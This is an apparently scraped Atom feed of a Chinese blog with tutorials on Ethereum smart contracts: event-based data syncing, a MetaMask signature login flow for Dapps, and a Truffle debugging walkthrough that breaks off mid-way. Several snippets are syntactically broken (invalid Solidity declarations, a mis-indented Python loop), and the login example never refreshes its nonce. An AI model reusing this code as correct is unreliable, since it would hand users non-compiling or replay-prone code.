<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>facert 的杂货店</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://facert.github.io/"/>
  <updated>2018-06-18T07:24:04.905Z</updated>
  <id>https://facert.github.io/</id>
  
  <author>
    <name>facert</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>智能合约开发 - 如何更好的与合约交互</title>
    <link href="https://facert.github.io/2018/06/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91-%E5%A6%82%E4%BD%95%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%B8%8E%E5%90%88%E7%BA%A6%E4%BA%A4%E4%BA%92/"/>
    <id>https://facert.github.io/2018/06/17/智能合约开发-如何更好的与合约交互/</id>
    <published>2018-06-17T13:24:30.000Z</published>
    <updated>2018-06-18T07:24:04.905Z</updated>
    
    <content type="html"><![CDATA[<p>我们从一个简单的例子开始：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Calc&#123;</span><br><span class="line">  uint count;</span><br><span class="line"></span><br><span class="line">  function add(uint a, uint b) returns(uint)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return a + b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCount() constant returns (uint)&#123;</span><br><span class="line">    return count;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是 Solidity 智能合约，我们将合约编译发布后，会通过 web3.js 调用，如调用 getCount()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myContract.getCount.call()</span><br></pre></td></tr></table></figure><p>web3.js 可以很方便的调用 json-rpc 接口来获得想要的数据，或者发起交易。</p><p>不过如果要进一步开发产品的话，会发现只依赖现存的一些调用函数会比较麻烦，举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Item&#123;</span><br><span class="line">  mapping(address =&gt; uint256[]) public ownedItems;</span><br><span class="line">  </span><br><span class="line">  function ListItem() returns(mapping)&#123;</span><br><span class="line">    return ownedItems[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function addItem(_itemId) returns (uint256)&#123;</span><br><span class="line">    ownedItems[msg.sender].push(_itemId);</span><br><span class="line">    return _itemId</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们先获得某个地址的 item, 可以通过函数 <code>Item.ListItem.call()</code> 获得数据，前端获得数据后展示即可。但需求加上根据条件过滤出 item，根据个人喜好推荐 item，这些原本在传统开发中很容易实现的功能，在智能合约的交互中会变的相对麻烦。</p><p>这里面我提供一种思路供大家参考，利用智能合约的 event 事件来同步数据。</p><p>event 也可以称为日志，是交易收据（Transaction Receipts）的一部分，他可以用来异步通知客户端交易的执行结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Item&#123;</span><br><span class="line">  mapping(address =&gt; uint256[]) public ownedItems;</span><br><span class="line">  </span><br><span class="line">  event AddItem(address, itemID);  // event</span><br><span class="line">  </span><br><span class="line">  function addItem(_itemId) returns (uint256)&#123;</span><br><span class="line">    ownedItems[msg.sender].push(_itemId);</span><br><span class="line">    AddItem(msg.sender, _itemId);</span><br><span class="line">    return _itemId;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如我们可以加个 AddItem 的事件，然后客户端监听事件结果，同步数据到 server 端，server 端保存到数据库后，可以根据需求开发 http 接口供前端调用，如过滤前三个月的，根据浏览量排行。</p><p><img src="/media/15293064015386.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def handle(self, *args, **options):</span><br><span class="line">    event_filter = w3.eth.filter(&#123;&quot;address&quot;: contract_address&#125;)</span><br><span class="line">    poll_interval = 2</span><br><span class="line">    while True:</span><br><span class="line">    for event in event_filter.get_new_entries():</span><br><span class="line">    handle_event(event)</span><br><span class="line">    time.sleep(poll_interval)</span><br></pre></td></tr></table></figure><p>event 可以给参数加 indexed 属性，这样这些参数值会存到日志结构的 topic 部分，有助于过滤和查找。</p><p>参考链接：</p><ol><li><a href="http://me.tryblockchain.org/blockchain-solidity-event.html" target="_blank" rel="noopener">http://me.tryblockchain.org/blockchain-solidity-event.html</a></li><li><a href="http://web3.tryblockchain.org/web3-js-in-action.html" target="_blank" rel="noopener">http://web3.tryblockchain.org/web3-js-in-action.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我们从一个简单的例子开始：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;
      
    
    </summary>
    
    
      <category term="智能合约" scheme="https://facert.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>智能合约开发 - 如何实现一键化登录 Dapp</title>
    <link href="https://facert.github.io/2018/06/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E4%B8%80%E9%94%AE%E5%8C%96%E7%99%BB%E5%BD%95-Dapp/"/>
    <id>https://facert.github.io/2018/06/17/智能合约开发-如何实现一键化登录-Dapp/</id>
    <published>2018-06-17T10:56:56.000Z</published>
    <updated>2018-06-17T13:20:19.083Z</updated>
    
    <content type="html"><![CDATA[<p>任何有帐户体系的网站和 app 都会有自己的登录模块，有时候还会集成 oauth2 （weibo, weixin，github)一键化登录.开发者肯定也都或多或少的开发过注册，登录的功能。那么基于以太坊的 Dapp 中登录功能会有什么区别呢？本文主要介绍了 Dapp 帐号体系的构成，以及如何基于 Metamask 开发一键化登录的功能。</p><p>首先 Dapp 跟普通的网站(app)没多少区别，完全可以延续之前的帐号体系登录，注册。在需要用到以太坊区块链的时候（比如创建交易，支付等）调用钱包或者 MetaMask 插件即可。</p><p>当然本身以太坊就有自己的帐号，每个人都可以创建 Address 来和区块链交互，所以如果我们的 Dapp 跟 Address 能够绑定并实现登录的话，整体的体验会好很多。</p><p>解决方案是利用私钥对 payload 加密生成 signature，然后再用<br>ecdsa_recover 方法对 signature 解密可以拿到对应的公钥。</p><p><img src="/media/15292352605816.gif" alt=""></p><p>我们来看下具体的步骤 （默认已经安装 MetaMask）</p><p>（1）前端点击登录按钮，首先通过 <code>web3.eth.accounts[0]</code> 拿到 publicAddress，然后去后端拿 nonce </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpClient.post(&apos;/api/user&apos;, &#123;address&#125;)</span><br></pre></td></tr></table></figure><p>（2）后端拿到 address 后，会去数据库查询是否存在这个用户，如果有，则直接返回跟 address 对应的 nonce。没有的话，会执行一个注册用户的过程，同样返回 nonce。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Profile(models.Model):</span><br><span class="line">    user = models.OneToOneField(User, on_delete=models.CASCADE)</span><br><span class="line">    public_address = models.CharField(max_length=256)</span><br><span class="line">    nonce = models.IntegerField()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def user()</span><br><span class="line">    public_address = boby.get(&quot;address&quot;)</span><br><span class="line">    profiles = Profile.objects.filter(public_address=public_address.lower())</span><br><span class="line">    </span><br><span class="line">    if not profiles.exists():</span><br><span class="line">        user = User.objects.create(username=public_address.lower())</span><br><span class="line">        profile = Profile.objects.create(user=user, public_address=public_address.lower(), nonce=generate_nonce())</span><br><span class="line">    else:</span><br><span class="line">        profile = profiles[0]</span><br><span class="line">    return profile</span><br></pre></td></tr></table></figure><p>(3) 前端拿到 nonce 之后会去找 MetaMask 签名生成 signature</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.personal.sign(nonce, public_address, callback);</span><br></pre></td></tr></table></figure><p>(4) 最后拿 signature 和 address 到后端验证是否签名正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpClient.post(&apos;/api/login&apos;, &#123;address, signature&#125;);</span><br></pre></td></tr></table></figure><p>(5) 后端验证，验证成功则完成登录（基于 session 或 jwt）操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message_hash = defunct_hash_message(text=&quot;signature nonce:%s&quot; % profile.nonce)</span><br><span class="line">recover_address = w3.eth.account.recoverHash(message_hash, signature=signature)</span><br><span class="line">if recover_address and recover_address.lower() == public_address:</span><br><span class="line">    user_login(request, profile.user)</span><br></pre></td></tr></table></figure><p>这里面的 recoverHash 函数是 python web3.py 模块的。由于以太坊的椭圆曲线加密函数签名参数与比特币不太一样，所以如果用其他椭圆加解密包没法验证通过的话，可查看是不是参数设置不同。</p><p>(6) 登录成功后，前后端交互就跟普通 http 请求没什么区别了。</p><p><img src="/media/15292413044056.jpg" alt=""></p><p>借用一张图来说明登录流程 （challenge 跟上文的 nonce 一致）</p><p>最后，我们其实可以看到目前这个登录方式强依赖于 MetaMask 插件，对于手机端 App 是无效的，需要有专门的钱包 app 来完成签名等功能。不过可以展望下，如果 Dapp 越来越多，那么这些基础插件会越来越丰富和完善。</p><p>参考链接：</p><ol><li><a href="https://www.toptal.com/ethereum/one-click-login-flows-a-metamask-tutorial" target="_blank" rel="noopener">https://www.toptal.com/ethereum/one-click-login-flows-a-metamask-tutorial</a></li><li><a href="https://github.com/amaurymartiny/login-with-metamask-demo" target="_blank" rel="noopener">https://github.com/amaurymartiny/login-with-metamask-demo</a></li><li><a href="https://github.com/m0t0k1ch1/metamask-login-sample" target="_blank" rel="noopener">https://github.com/m0t0k1ch1/metamask-login-sample</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;任何有帐户体系的网站和 app 都会有自己的登录模块，有时候还会集成 oauth2 （weibo, weixin，github)一键化登录.开发者肯定也都或多或少的开发过注册，登录的功能。那么基于以太坊的 Dapp 中登录功能会有什么区别呢？本文主要介绍了 Dapp 帐号体
      
    
    </summary>
    
    
      <category term="智能合约" scheme="https://facert.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://facert.github.io/2018/05/14/2018-05-14/"/>
    <id>https://facert.github.io/2018/05/14/2018-05-14/</id>
    <published>2018-05-14T03:04:18.011Z</published>
    <updated>2018-05-14T03:04:18.011Z</updated>
    
    <content type="html"><![CDATA[<p># </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;# &lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>智能合约调试指南</title>
    <link href="https://facert.github.io/2018/04/06/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B0%83%E8%AF%95%E6%8C%87%E5%8D%97/"/>
    <id>https://facert.github.io/2018/04/06/智能合约调试指南/</id>
    <published>2018-04-06T06:52:26.000Z</published>
    <updated>2018-04-06T09:11:39.061Z</updated>
    
    <content type="html"><![CDATA[<p><code>注意：本教程的 Truffle 版本 4.4.0 及以上</code></p><p>不像你在其他地方看到的纸质合约，以太坊的智能合约是代码组成的，需要你以非常谨慎的态度去对待它。</p><p>（这是一件好事，想象下如果现实世界的合同需要编译的话会更清晰么？）</p><p>如果我们的合同没有被正确的编码出来, 我们的交易可能会失败，导致以太币的损失(以 gas 的形式)，更不用说浪费时间和精力。</p><p><strong>幸运的是，Truffle (版本 4 以上) 内置了逐步调试的功能</strong>，所以一旦发生错误，你可以很快发现并修复它。</p><p>在本教程中,我们将在测试的区块链环境中部署一个基础的合同，并引入一些错误，通过 Truffle 内置调试器修复它们。<br><a id="more"></a></p><h4 id="一个基础的智能合约"><a href="#一个基础的智能合约" class="headerlink" title="一个基础的智能合约"></a>一个基础的智能合约</h4><p>一个最基础的合同是一个简单的存储类型的智能合约。（这个例子改编自 <a href="https://solidity.readthedocs.io/en/develop/introduction-to-smart-contracts.html" target="_blank" rel="noopener">Solidity documentation</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.17;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">  uint myVariable;</span><br><span class="line"></span><br><span class="line">  function set(uint x) public &#123;</span><br><span class="line">    myVariable = x;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function get() constant public returns (uint) &#123;</span><br><span class="line">    return myVariable;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此合约做了两件事：</p><ul><li>允许你设置一个变量（myVariable）为特定整数值。</li><li>允许你查询一个选定的值。</li></ul><p>这不是一个非常有趣的合约，但是这不是重点。我们想看看出错后会发生什么当事情。</p><p>首先我们配置环境。</p><h4 id="部署智能合约"><a href="#部署智能合约" class="headerlink" title="部署智能合约"></a>部署智能合约</h4><ol><li><p>首先为我们的合约创建一个新的本地目录:</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir simple-storage</span><br><span class="line">cd simple-storage</span><br></pre></td></tr></table></figure></li><li><p>创建一个空的 Truffle 项目</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle init</span><br></pre></td></tr></table></figure></li></ol><pre><code>这个命令将创建目录，比如 `contracts/` 和 `migrations/`,并生成一些文件用于帮助部署合约到区块链。</code></pre><ol><li><p><code>contracts/</code> 目录中有一个 <code>Store.sol</code> 文件。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.17;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">  uint myVariable;</span><br><span class="line"></span><br><span class="line">  function set(uint x) public &#123;</span><br><span class="line">    myVariable = x;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function get() constant public returns (uint) &#123;</span><br><span class="line">    return myVariable;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><pre><code>这是我们需要调试的合约，详细的合约内容的解释超出了本教程的范围，注意我们有一个名为 `SimpleStorage` 的合约，里面有个数字类型的变量 `myVariable` 和两个函数 `set()` 和 `get()`。第一个函数设置变量内容，第二个获取变量。</code></pre><ol><li><p><code>migrations/</code> 目录下，有个 <code>2_deploy_contracts.js</code> 文件。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var SimpleStorage = artifacts.require(&quot;SimpleStorage&quot;);</span><br><span class="line"></span><br><span class="line">module.exports = function(deployer) &#123;</span><br><span class="line">  deployer.deploy(SimpleStorage);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><pre><code>这个文件是管理部署 `SimpleStorage` 合约的。</code></pre><ol><li><p>在终端中，编译此合约 </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle compile</span><br></pre></td></tr></table></figure></li><li><p>再开一个终端，运行 <code>truffle develop</code> ，开启 truffle 内置的测试区块链，这样我们可以使用它来测试合约。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle develop</span><br></pre></td></tr></table></figure><p> 这个命令将出现提示符 <code>truffle(develop)&gt;</code>， 从现在开始，所有的命令都在此提示符下输入（特殊情况会说明）</p></li><li><p>当开发控制台运行起来后，我们可以部署我们的合约了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate</span><br></pre></td></tr></table></figure></li></ol><ol><li>下面的相应有些类似，除了 id 不同。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Running migration: 1_initial_migration.js</span><br><span class="line">  Replacing Migrations...</span><br><span class="line">  ... 0xe4f911d95904c808a81f28de1e70a377968608348b627a66efa60077a900fb4c</span><br><span class="line">  Migrations: 0x3ed10fd31b3fbb2c262e6ab074dd3c684b8aa06b</span><br><span class="line">Saving successful migration to network...</span><br><span class="line">  ... 0x429a40ee574664a48753a33ea0c103fc78c5ca7750961d567d518ff7a31eefda</span><br><span class="line">Saving artifacts...</span><br><span class="line">Running migration: 2_deploy_contracts.js</span><br><span class="line">  Replacing SimpleStorage...</span><br><span class="line">  ... 0x6783341ba67d5c0415daa647513771f14cb8a3103cc5c15dab61e86a7ab0cfd2</span><br><span class="line">  SimpleStorage: 0x377bbcae5327695b32a1784e0e13bedc8e078c9c</span><br><span class="line">Saving successful migration to network...</span><br><span class="line">  ... 0x6e25158c01a403d33079db641cb4d46b6245fd2e9196093d9e5984e45d64a866</span><br><span class="line">Saving artifacts...</span><br></pre></td></tr></table></figure><h4 id="和基础的智能合约交互"><a href="#和基础的智能合约交互" class="headerlink" title="和基础的智能合约交互"></a>和基础的智能合约交互</h4><p>智能合约通过 <code>truffle develop</code> 部署到了测试网络中，运行 <a href="http://truffleframework.com/docs/getting_started/console" target="_blank" rel="noopener">console</a> 而不是 <a href="http://truffleframework.com/ganache/" target="_blank" rel="noopener">Ganache</a>，一个内置在 Truffle 的本地区块链。</p><ol><li><p>在 <code>truffle develop</code> 运行的终端中，输入如下命令：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.get.call();&#125;).then(function(value)&#123;return value.toNumber()&#125;);</span><br></pre></td></tr></table></figure><p> 这个命令找到 SimpleStorage 合约，然后调用 <code>get()</code> 命令，通常返回一个字符串并转化为数字。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure></li></ol><pre><code>`myVariable` 被设置为 0，尽管我们还没给它赋值。这是因为 Solidity 数值型变量会自动被赋值为 0，不像其他语言会是 `NULL` 和 `undefined`。</code></pre><ol><li><p>现在我们运行一条交易命令，调用 <code>set()</code> 设置我们的变量为其他值。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);</span><br></pre></td></tr></table></figure><p> 设置变量为 4，返回的信息包括交易（交易 id ，交易receipt 和一些交易的时间 log）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &#123; tx: &apos;0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42&apos;,</span><br><span class="line">receipt:</span><br><span class="line"> &#123; transactionHash: &apos;0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42&apos;,</span><br><span class="line">   transactionIndex: 0,</span><br><span class="line">   blockHash: &apos;0x60adbf0523622dc1be52c627f37644ce0a343c8e7c8955b34c5a592da7d7c651&apos;,</span><br><span class="line">   blockNumber: 5,</span><br><span class="line">   gasUsed: 41577,</span><br><span class="line">   cumulativeGasUsed: 41577,</span><br><span class="line">   contractAddress: null,</span><br><span class="line">   logs: [] &#125;,</span><br><span class="line">logs: [] &#125;</span><br></pre></td></tr></table></figure></li></ol><pre><code>最重要的是交易的 id (在这里是 tx 和 transactionHash)。我们需要赋值这个值用来调试。</code></pre><ol><li><p>想验证值是否已经改变，运行 <code>get()</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.get.call();&#125;).then(function(value)&#123;return value.toNumber()&#125;);</span><br></pre></td></tr></table></figure></li><li><p>输出</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure></li></ol><h4 id="调试错误"><a href="#调试错误" class="headerlink" title="调试错误"></a>调试错误</h4><p>上文展示了智能合约如何工作，现在我们引入一些错误到合约中。</p><p>针对如下几个错误</p><ul><li>无限循环</li><li>无效错误检查</li><li>无错误，但是函数没有按预期执行</li></ul><h5 id="错误-1-无限循环"><a href="#错误-1-无限循环" class="headerlink" title="错误 #1: 无限循环"></a>错误 #1: 无限循环</h5><p>在以太坊区块链中，交易不能永远执行下去。</p><p>一个交易会一直执行到 gas 用尽。一旦发生这种情况，交易会返回 <code>out of gas</code> 错误。</p><p>因为 gas 是以以太币计费的，所以会造成真实的资产损失，所以修复这种错误迫在眉睫。</p><p><strong>引入错误</strong></p><ol><li>在编辑器打开 <code>contracts/</code> 目录中的 <code>Store.sol</code></li><li><p>替换 <code>set()</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function set(uint x) public &#123;</span><br><span class="line">  while(true) &#123;</span><br><span class="line">    myVariable = x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>因为 <code>while(true)</code> 所以函数永远不会退出。</p><p><strong>测试合约</strong></p><p>Truffle 的开发终端不重启就可以重新部署合约。我们可以通过 <code>migrate</code> 一步编译和部署合约</p><ol><li><p>Truffle 的开发终端中，更新合约</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate --reset</span><br></pre></td></tr></table></figure></li><li><p>为了更好的捕获错误，我们打开第二个终端</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truffle develop --log</span><br></pre></td></tr></table></figure><p> 然后回到之前的终端中</p></li><li><p>现在我们可以运行交易了，运行 <code>set()</code> 命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleStorage.deployed().then(function(instance)&#123;return instance.set(4);&#125;);</span><br></pre></td></tr></table></figure></li><li><p>捕获到错误</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: VM Exception while processing transaction: out of gas</span><br></pre></td></tr></table></figure></li></ol><pre><code>在 log 的终端中，我们可以看到更多信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    develop:testrpc eth_sendTransaction +0ms</span><br><span class="line">develop:testrpc  +1s</span><br><span class="line">develop:testrpc   Transaction: 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f +2ms</span><br><span class="line">develop:testrpc   Gas usage: 4712388 +11ms</span><br><span class="line">develop:testrpc   Block Number: 6 +15ms</span><br><span class="line">develop:testrpc   Runtime Error: out of gas +0ms</span><br><span class="line">develop:testrpc  +16ms</span><br></pre></td></tr></table></figure>通过这些信息，我们可以调试这个交易</code></pre><p><strong>调试错误</strong></p><p>调出 debug 的命令是在 Truffle 开发终端输入 <code>debug &lt;Transaction ID&gt;</code> 或者直接在终端中输入 <code>truffle debug &lt;Transaction ID&gt;</code>，现在让我们开始吧!</p><ol><li><p>在 Truffle 开发终端中，复制粘贴交易 id 到 debug 命令后</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f</span><br></pre></td></tr></table></figure><p> 你将看到如下输出</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> Gathering transaction data...</span><br><span class="line"></span><br><span class="line">Addresses affected:</span><br><span class="line">  0x377bbcae5327695b32a1784e0e13bedc8e078c9c - SimpleStorage</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">(enter) last command entered (step next)</span><br><span class="line">(o) step over, (i) step into, (u) step out, (n) step next</span><br><span class="line">(;) step instruction, (p) print instruction, (h) print this help, (q) quit</span><br><span class="line"></span><br><span class="line">Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:</span><br><span class="line"></span><br><span class="line">1: pragma solidity ^0.4.17;</span><br><span class="line">2:</span><br><span class="line">3: contract SimpleStorage &#123;</span><br><span class="line">   ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line"></span><br><span class="line">debug(develop:0xe4933407...)&gt;</span><br></pre></td></tr></table></figure></li></ol><pre><code>这是个交互式命令行，你可以用列出的命令和程序交互* 最常用的命令是 `step next`，命令执行一次往下一行代码，快捷键是 `Enter` 或者 `n` 输出        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:    4:   uint myVariable;    5:    6: function set(uint x) public {       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^注意程序已经移动到了下一个命令，第六行中。* 键入 `Enter`        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {        ^^^^^^^^^^^^* 不断按 `Enter`        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {               ^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        5:        6: function set(uint x) public {        7:   while(true) {         ^^^^^^^^^^^^        debug(develop:0xe4933407...)&gt;        Store.sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c:        6: function set(uint x) public {        7:   while(true) {        8:     myVariable = x;                        ^        debug(develop:0xe4933407...)&gt;        Store.sol 